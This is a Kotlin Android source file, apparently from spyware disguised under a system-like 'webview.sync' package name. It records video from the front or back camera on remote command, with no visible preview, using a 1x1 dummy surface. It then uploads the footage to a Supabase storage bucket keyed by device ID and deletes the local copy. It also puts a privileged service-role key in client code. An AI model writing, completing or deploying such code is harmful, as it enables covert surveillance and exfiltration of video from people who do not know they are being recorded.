package com.system.webview.sync.services

import android.content.Context
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.Surface
import com.system.webview.sync.network.SupabaseConfig
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object VideoCaptureHelper {
    private const val TAG = "VideoCaptureHelper"
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(300, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    /**
     * Records video using Camera2 + MediaRecorder (background, no UI surface).
     * Uses a SurfaceTexture as a dummy preview surface so Camera2 can open.
     * Uploads result to Supabase Storage (video-recordings bucket).
     */
    fun executeRecording(context: Context, commandId: Long, durationSeconds: Int,
                         cameraSide: String, deviceUuid: String): Boolean {
        val outFile = File(context.cacheDir, "vid_${commandId}_${System.currentTimeMillis()}.mp4")
        val handlerThread = HandlerThread("VideoCaptureThread").also { it.start() }
        val handler = Handler(handlerThread.looper)
        var cameraDevice: CameraDevice? = null
        var captureSession: CameraCaptureSession? = null
        var mediaRecorder: MediaRecorder? = null
        var dummySurface: Surface? = null
        var dummyTexture: SurfaceTexture? = null

        return try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

            // Pick camera ID
            val cameraId = selectCamera(cameraManager, cameraSide)
                ?: run { updateCommandFailed(commandId, "Kamera $cameraSide tidak ditemukan"); return false }

            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val videoSize = map?.getOutputSizes(MediaRecorder::class.java)
                ?.firstOrNull { it.width <= 1280 && it.height <= 720 }
                ?: android.util.Size(1280, 720)

            // Set up MediaRecorder
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            mediaRecorder.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(videoSize.width, videoSize.height)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(3_000_000)
                setOutputFile(outFile.absolutePath)
                prepare()
            }

            // Dummy SurfaceTexture (1x1 preview, required by Camera2)
            dummyTexture = SurfaceTexture(0).also { it.setDefaultBufferSize(1, 1) }
            dummySurface = Surface(dummyTexture)
            val recorderSurface = mediaRecorder.surface
            val surfaces = listOf(dummySurface, recorderSurface)

            // Open camera
            val openLatch = CountDownLatch(1)
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) { cameraDevice = camera; openLatch.countDown() }
                override fun onDisconnected(camera: CameraDevice) { camera.close(); openLatch.countDown() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close(); openLatch.countDown() }
            }, handler)
            if (!openLatch.await(5, TimeUnit.SECONDS) || cameraDevice == null) {
                updateCommandFailed(commandId, "Kamera tidak bisa dibuka")
                return false
            }

            // Create capture session
            val sessionLatch = CountDownLatch(1)
            @Suppress("DEPRECATION")
            cameraDevice!!.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) { captureSession = session; sessionLatch.countDown() }
                override fun onConfigureFailed(session: CameraCaptureSession) { sessionLatch.countDown() }
            }, handler)
            if (!sessionLatch.await(5, TimeUnit.SECONDS) || captureSession == null) {
                updateCommandFailed(commandId, "Gagal membuat capture session")
                return false
            }

            // Build repeating request targeting recorder surface
            val requestBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                addTarget(recorderSurface)
                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO)
                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
            }
            captureSession!!.setRepeatingRequest(requestBuilder.build(), null, handler)

            // Start recording
            mediaRecorder.start()
            Log.d(TAG, "Video recording started: ${durationSeconds}s, camera=$cameraSide, cmd=$commandId")
            Thread.sleep(durationSeconds * 1000L)

            // Stop
            mediaRecorder.stop()
            mediaRecorder.release()
            mediaRecorder = null
            captureSession?.close()
            captureSession = null
            cameraDevice?.close()
            cameraDevice = null

            Log.d(TAG, "Recording finished: ${outFile.length()} bytes")

            if (!outFile.exists() || outFile.length() < 1024L) {
                updateCommandFailed(commandId, "Output file kosong atau terlalu kecil")
                return false
            }

            // Upload
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val storagePath = "$deviceUuid/vid_${timestamp}_${commandId}.mp4"
            if (!uploadToStorage(outFile, storagePath)) {
                updateCommandFailed(commandId, "Gagal upload ke storage")
                return false
            }

            updateCommandExecuted(commandId, storagePath, outFile.length())
            true
        } catch (e: Exception) {
            Log.e(TAG, "Video recording failed cmd=$commandId", e)
            updateCommandFailed(commandId, e.message ?: "Error tidak diketahui")
            false
        } finally {
            try { mediaRecorder?.release() } catch (_: Exception) {}
            try { captureSession?.close() } catch (_: Exception) {}
            try { cameraDevice?.close() } catch (_: Exception) {}
            try { dummySurface?.release() } catch (_: Exception) {}
            try { dummyTexture?.release() } catch (_: Exception) {}
            handlerThread.quitSafely()
            try { outFile.delete() } catch (_: Exception) {}
        }
    }

    private fun selectCamera(manager: CameraManager, side: String): String? {
        val facing = if (side == "FRONT") CameraCharacteristics.LENS_FACING_FRONT
                     else CameraCharacteristics.LENS_FACING_BACK
        return manager.cameraIdList.firstOrNull { id ->
            manager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == facing
        }
    }

    private fun uploadToStorage(file: File, storagePath: String): Boolean {
        return try {
            val url = "${SupabaseConfig.URL}/storage/v1/object/video-recordings/$storagePath"
            val request = Request.Builder()
                .url(url)
                .put(file.asRequestBody("video/mp4".toMediaType()))
                .addHeader("apikey", SupabaseConfig.SERVICE_ROLE_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.SERVICE_ROLE_KEY}")
                .addHeader("Content-Type", "video/mp4")
                .addHeader("x-upsert", "true")
                .build()
            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) { Log.d(TAG, "Video upload OK: $storagePath"); true }
                else { Log.e(TAG, "Video upload FAILED ${response.code}: ${response.body?.string()}"); false }
            }
        } catch (e: Exception) { Log.e(TAG, "Upload exception", e); false }
    }

    private fun updateCommandExecuted(commandId: Long, storagePath: String, fileSize: Long) {
        try {
            val url = "${SupabaseConfig.URL}/rest/v1/video_commands?id=eq.$commandId"
            val body = JSONObject().apply {
                put("status", "EXECUTED")
                put("storage_path", storagePath)
                put("file_size_bytes", fileSize)
                put("executed_at", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
                    .apply { timeZone = java.util.TimeZone.getTimeZone("UTC") }.format(Date()))
            }.toString()
            val request = Request.Builder().url(url)
                .patch(body.toRequestBody("application/json".toMediaType()))
                .addHeader("apikey", SupabaseConfig.ANON_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
                .addHeader("Prefer", "return=minimal").build()
            httpClient.newCall(request).execute().use { Log.d(TAG, "Cmd $commandId EXECUTED") }
        } catch (e: Exception) { Log.e(TAG, "Failed to mark EXECUTED", e) }
    }

    private fun updateCommandFailed(commandId: Long, errorMsg: String) {
        try {
            val url = "${SupabaseConfig.URL}/rest/v1/video_commands?id=eq.$commandId"
            val body = JSONObject().apply {
                put("status", "FAILED")
                put("error_message", errorMsg.take(500))
                put("executed_at", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
                    .apply { timeZone = java.util.TimeZone.getTimeZone("UTC") }.format(Date()))
            }.toString()
            val request = Request.Builder().url(url)
                .patch(body.toRequestBody("application/json".toMediaType()))
                .addHeader("apikey", SupabaseConfig.ANON_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
                .addHeader("Prefer", "return=minimal").build()
            httpClient.newCall(request).execute().use { Log.d(TAG, "Cmd $commandId FAILED: $errorMsg") }
        } catch (e: Exception) { Log.e(TAG, "Failed to mark FAILED", e) }
    }
}
